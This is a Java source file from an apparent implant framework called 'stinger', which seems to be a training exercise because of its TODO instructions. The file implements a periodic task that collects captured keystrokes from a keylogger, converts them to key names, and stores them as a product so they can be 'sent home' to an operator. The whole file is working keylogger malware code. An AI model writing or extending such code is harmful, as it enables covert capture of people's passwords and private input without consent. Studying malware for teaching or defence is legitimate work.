package stinger.os.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import stinger.StingerEnvironment;
import stinger.storage.StandardProductType;
import stinger.storage.Storage;
import stinger.storage.impl.BinaryProduct;
import stingerlib.storage.StorageException;

import java.util.List;

class KeyloggerStoreTask implements Runnable {

    private final Keylogger mKeylogger;
    private final StingerEnvironment mEnvironment;

    KeyloggerStoreTask(Keylogger keylogger, StingerEnvironment environment) {
        mKeylogger = keylogger;
        mEnvironment = environment;
    }

    @Override
    public void run() {
        // TODO: IMPLEMENT
        // this will be called periodically.
        // in here you should save the keylogger data as a product into the storage
        // so it could be sent home.
        // use code you put in Keylogger to access the keylogger data.
        // use StandardProductType.KEY_LOGGER and BinaryProduct/FileProduct (depending on you choice).

        try {
            List<Integer> keyCodes = mKeylogger.getKeyCodes();

            // Turn the integer codes into a text representing the keys
            StringBuilder builder = new StringBuilder();
            for (int keyCode : keyCodes) {
                String keyText = NativeKeyEvent.getKeyText(keyCode);
                builder.append(keyText);
                builder.append(',');
            }

            // store the string
            Storage storage = mEnvironment.getStorage();
            storage.store(new BinaryProduct(builder.toString(), StandardProductType.KEY_LOGGER));
        } catch (StorageException e) {
            mEnvironment.getLogger().error("Error keylogger store", e);
        }
    }
}
